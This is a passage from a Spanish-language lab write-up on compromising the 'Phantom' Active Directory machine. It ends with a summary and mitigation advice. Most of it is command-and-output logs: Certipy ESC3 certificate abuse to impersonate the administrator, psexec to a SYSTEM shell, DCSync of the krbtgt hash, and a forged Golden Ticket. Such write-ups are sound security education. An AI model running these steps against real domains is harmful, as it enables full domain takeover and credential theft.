La contraseña pertenecía al usuario `tomas`, con acceso WinRM confirmado. Se verifica su pertenencia a grupos:

<pre class="term-log">
<span class="cmd">$ evil-winrm -i 192.168.56.100 -u tomas -p 'f6Y%UPa6ZB[...]'</span>

Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
<span class="cmd">*Evil-WinRM* PS C:\Users\tomas\Documents> whoami /groups</span>

Nombre de grupo                                                    Tipo           SID                                          Atributos
================================================================== ============== ============================================ ==========================================================================
<span class="hl">PHANTOM\DevOps                                                     Grupo          S-1-5-21-3580157585-956322742-780763674-1123 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span>

<span class="cmd">*Evil-WinRM* PS C:\Users\tomas\Documents> whoami /priv</span>

Nombre de privilegio          Descripción                                  Estado
============================= ============================================ ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
SeChangeNotifyPrivilege       Omitir comprobación de recorrido             Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
</pre>

`tomas` pertenece al mismo grupo `DevOps` que `robert`, sin privilegios de sistema adicionales visibles. La escalada final requiere buscar en otra superficie: los servicios de certificados del dominio.

## Escalada de privilegios — ADCS ESC3

Se enumera Active Directory Certificate Services con Certipy:

<pre class="term-log">
<span class="cmd">$ certipy-ad find -u tomas -p 'f6Y%UPa6ZB[...]' -dc-ip 192.168.56.100 -stdout</span>
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates

Certificate Authorities
  0
    CA Name                             : PHANTOM-DC01-CA
    DNS Name                            : DC01.PHANTOM.THL
    Permissions
      Access Rights
        Enroll                          : PHANTOM.THL\Authenticated Users

[...]

  33
<span class="hl">    Template Name                       : Phantom-DevAuth
    Display Name                        : Phantom-DevAuth
    Certificate Authorities             : PHANTOM-DC01-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Extended Key Usage                  : Certificate Request Agent</span>
    Requires Manager Approval           : False
    Schema Version                      : 2
    Permissions
      Enrollment Permissions
<span class="hl">        Enrollment Rights               : PHANTOM.THL\Tomas
                                          PHANTOM.THL\Admins. del dominio
                                          PHANTOM.THL\Administradores de empresas</span>
      Object Control Permissions
        Owner                           : PHANTOM.THL\Administrador
    <span class="hl-green">[+] User Enrollable Principals      : PHANTOM.THL\Tomas</span>
    [!] Vulnerabilities
<span class="hl-green">      ESC3                              : Template has Certificate Request Agent EKU set.</span>
</pre>

Se identifica la plantilla personalizada `Phantom-DevAuth`, con permisos de enrollment exclusivos para `tomas` y marcada por Certipy como vulnerable a **ESC3**. Se aísla su definición completa:

<pre class="term-log">
<span class="cmd">$ certipy-ad find -u tomas -p 'f6Y%UPa6ZB[...]' -dc-ip 192.168.56.100 -stdout | grep -A 40 "Phantom-DevAuth"</span>
Certipy v5.1.0 - by Oliver Lyak (ly4k)

    Template Name                       : Phantom-DevAuth
    Display Name                        : Phantom-DevAuth
    Certificate Authorities             : PHANTOM-DC01-CA
    Enabled                             : True
    Enrollment Agent                    : True
    Extended Key Usage                  : Certificate Request Agent
    Permissions
      Enrollment Permissions
        Enrollment Rights               : PHANTOM.THL\Tomas
                                          PHANTOM.THL\Admins. del dominio
                                          PHANTOM.THL\Administradores de empresas
    [+] User Enrollable Principals      : PHANTOM.THL\Tomas
    [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
</pre>

### ¿Qué es ESC3?

La plantilla tiene el EKU `Certificate Request Agent`, lo que la convierte en una plantilla de "agente de inscripción": cualquier titular de un certificado emitido con ella puede solicitar, en nombre de otro principal del dominio, un certificado válido para autenticación (*on-behalf-of*). Esto permite suplantar a cualquier usuario, incluyendo administradores, sin conocer sus credenciales.

**Paso 1** — Solicitar certificado de agente de inscripción como `tomas`:

<pre class="term-log">
<span class="cmd">$ certipy-ad req -u tomas@PHANTOM.THL -p 'f6Y%UPa6ZB[...]' -dc-ip 192.168.56.100 \
  -ca PHANTOM-DC01-CA -target DC01.PHANTOM.THL -template Phantom-DevAuth</span>
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 12
[*] Successfully requested certificate
<span class="hl-green">[*] Got certificate with UPN 'tomas@PHANTOM.THL'</span>
[*] Certificate has no object SID
[*] Saving certificate and private key to 'tomas.pfx'
[*] Wrote certificate and private key to 'tomas.pfx'
</pre>

**Paso 2** — Usar el certificado de agente para solicitar, en nombre de Administrador, un certificado con la plantilla `User`:

<pre class="term-log">
<span class="cmd">$ certipy-ad req -u tomas@PHANTOM.THL -p 'f6Y%UPa6ZB[...]' -dc-ip 192.168.56.100 \
  -ca PHANTOM-DC01-CA -target DC01.PHANTOM.THL -template User \
  -on-behalf-of administrador -pfx tomas.pfx</span>
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
<span class="hl-green">[*] Got certificate with UPN 'administrador@PHANTOM.THL'</span>
[*] Saving certificate and private key to 'administrador.pfx'
[*] Wrote certificate and private key to 'administrador.pfx'
</pre>

**Paso 3** — Autenticarse con el certificado para obtener TGT y hash NTLM:

<pre class="term-log">
<span class="cmd">$ certipy-ad auth -pfx administrador.pfx -username administrador -domain PHANTOM.THL -dc-ip 192.168.56.100</span>
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrador@PHANTOM.THL'
[*] Using principal: 'administrador@phantom.thl'
[*] Trying to get TGT...
<span class="hl-green">[*] Got TGT</span>
[*] Saving credential cache to 'administrador.ccache'
[*] Trying to retrieve NT hash for 'administrador'
<span class="hl-green">[*] Got hash for 'administrador@phantom.thl': aad3b435b51404eeaad3b435b51404ee:dda94fc1fe0[...]</span>
</pre>

Con el TGT obtenido, se accede al DC con privilegios totales:

<pre class="term-log">
<span class="cmd">$ export KRB5CCNAME=administrador.ccache</span>
</pre>

<pre class="term-log">
<span class="cmd">$ impacket-psexec administrador@DC01.PHANTOM.THL -k -no-pass</span>
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.PHANTOM.THL.....
[*] Found writable share ADMIN$
[*] Uploading file AdYNuTJP.exe
[*] Opening SVCManager on DC01.PHANTOM.THL.....
[*] Creating service jrTb on DC01.PHANTOM.THL.....
[*] Starting service jrTb.....
Microsoft Windows [Versión 10.0.20348.587]

(c) Microsoft Corporation. Todos los derechos reservados.

<span class="cmd">C:\Windows\system32> whoami</span>
<span class="hl-green">nt authority\system</span>

<span class="cmd">C:\Windows\system32> type C:\Users\Administrador\Desktop\root.txt</span>
<span class="hl-green">568e7df15c65b751[...]</span>
</pre>

*(Flag ofuscada intencionadamente en este write-up.)*

## Post-explotación — Persistencia con Golden Ticket

Con privilegios de Administrador, se demuestra (solo en el laboratorio) la técnica de persistencia más representativa en Active Directory: extracción del hash de `krbtgt` vía DCSync y forja de un Golden Ticket.

<pre class="term-log">
<span class="cmd">$ impacket-secretsdump PHANTOM.THL/administrador@192.168.56.100 \
  -hashes aad3b435b51404eeaad3b435b51404ee:dda94fc1fe0[...] \
  -just-dc-user krbtgt</span>
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
<span class="hl-green">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:403e573fbe0[...]:::</span>
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:21575e01f32[...]
krbtgt:aes128-cts-hmac-sha1-96:17e69648548[...]
krbtgt:des-cbc-md5:64f42cf72f1[...]
[*] Cleaning up...
</pre>

Con el hash de `krbtgt` y el SID del dominio, se forja un ticket Kerberos válido para Administrador sin depender ya del certificado original:

<pre class="term-log">
<span class="cmd">$ impacket-ticketer -nthash 403e573fbe0[...] \
  -domain-sid S-1-5-21-3580157585-956322742-780763674 \
  -domain PHANTOM.THL administrador</span>
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for PHANTOM.THL/administrador
[*] Signing/Encrypting final ticket
<span class="hl-green">[*] Saving ticket in administrador.ccache</span>
</pre>

<pre class="term-log">
<span class="cmd">$ export KRB5CCNAME=administrador.ccache</span>
</pre>

<pre class="term-log">
<span class="cmd">$ impacket-psexec PHANTOM.THL/administrador@DC01.PHANTOM.THL -k -no-pass</span>
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.PHANTOM.THL.....
[*] Found writable share ADMIN$
[*] Uploading file aPefzkTb.exe
[*] Opening SVCManager on DC01.PHANTOM.THL.....
[*] Creating service qepF on DC01.PHANTOM.THL.....
[*] Starting service qepF.....
Microsoft Windows [Versión 10.0.20348.587]

(c) Microsoft Corporation. Todos los derechos reservados.

<span class="cmd">C:\Windows\system32> whoami</span>
<span class="hl-green">nt authority\system</span>
</pre>

El ticket forjado funciona de forma completamente independiente al vector de entrada original (ESC3), confirmando que el atacante conserva control total del dominio incluso si se revoca el certificado inicial, se cambia la contraseña de Administrador, o se corrige la plantilla vulnerable. Solo la rotación doble del `krbtgt` invalidaría esta persistencia.

*Nota de laboratorio: esta técnica se ejecutó únicamente como demostración en un entorno aislado y autorizado. En una auditoría real, este hallazgo se reporta inmediatamente sin mantener el acceso persistente.*

## Cadena de ataque resumida

| Fase | Vector | Usuario resultante |
|---|---|---|
| Acceso inicial | Abuso de ACLs encadenadas (OwnerEdit + DACL + AddSelf) | mark → bob → frank |
| Movimiento lateral | LLMNR/NBT-NS/MDNS Poisoning (Responder) | robert |
| Movimiento lateral | Tombstone AD + Password Spraying | tomas |
| Escalada de privilegios | ADCS ESC3 (Phantom-DevAuth) | Administrador |
| Persistencia | DCSync + Golden Ticket | krbtgt (dominio completo) |

## Conclusión

La cadena de compromiso de Phantom combina cinco fallos independientes que, encadenados, entregan el dominio completo. Una serie de ACLs mal calculadas sobre objetos y grupos (`bob`, `IT`, `HelpDesk`) permite escalar desde un usuario con privilegios mínimos hasta una cuenta con acceso WinRM, sin explotar ninguna vulnerabilidad de software. Un script de mantenimiento (`connect.ps1`) que referencia un dominio inexistente genera tráfico de resolución de nombres constantemente envenenable, entregando credenciales de un segundo usuario. Un objeto tombstone no purgado correctamente expone en texto claro la contraseña de una cuenta de prueba, reutilizable mediante password spraying contra un tercer usuario. Ese usuario tiene permisos de enrollment exclusivos sobre una plantilla de certificado (`Phantom-DevAuth`) vulnerable a ESC3, lo que permite emitir un certificado válido como Administrador sin conocer su contraseña. Finalmente, el acceso de Administrador permite extraer el hash de `krbtgt` y forjar un Golden Ticket, demostrando persistencia total e independiente del vector de entrada original.

## Recomendaciones de mitigación

**Abuso de ACLs**: auditar periódicamente las DACL de objetos y grupos de AD con BloodHound u otras herramientas equivalentes, buscando específicamente ACEs no heredadas (`IsInherited: false`) que concedan `GenericAll`, `WriteDacl`, `WriteOwner` o `AddSelf` a principals no administrativos. Revisar el principio de mínimo privilegio en cualquier delegación de soporte técnico (HelpDesk, IT) para evitar cadenas de escalada transitivas.

**LLMNR/NBT-NS/MDNS Poisoning**: deshabilitar LLMNR (GPO *Turn off Multicast Name Resolution*) y NBT-NS a nivel de adaptador de red; migrar exclusivamente a DNS interno bien configurado. Corregir cualquier script o aplicación que referencie nombres de dominio incorrectos, como en este caso un script apuntando a un dominio `.LOCAL` inexistente en lugar del dominio real.

**Tombstone Recovery**: reducir el tiempo de exposición de atributos sensibles en objetos eliminados; nunca almacenar contraseñas en el atributo `Description` u otros campos de texto libre. Purgar de forma segura las cuentas de prueba en lugar de solo eliminarlas de forma estándar, especialmente tras migraciones de infraestructura.

**ADCS ESC3**: auditar periódicamente todas las plantillas de certificado con `certipy-ad find -vulnerable`; restringir el EKU `Certificate Request Agent` solo a cuentas de servicio estrictamente necesarias, nunca a usuarios estándar. Aplicar el principio de mínimo privilegio en `Enrollment Rights`. Consultar la [documentación de Microsoft sobre AD CS](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/) y los [advisories de MITRE ATT&CK sobre abuso de certificados (T1649)](https://attack.mitre.org/techniques/T1649/).

**DCSync / Golden Ticket**: restringir los permisos de replicación de directorio (*Replicating Directory Changes* / *Replicating Directory Changes All*) exclusivamente a cuentas de servicio de replicación legítimas. Rotar el hash de `krbtgt` dos veces de forma periódica y tras cualquier incidente confirmado, siguiendo las [recomendaciones de Microsoft sobre reseteo de krbtgt](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-golden-ticket-mitigation). Monitorizar el evento 4662 (acceso a objetos con GUID de replicación) para detectar DCSync no autorizado.
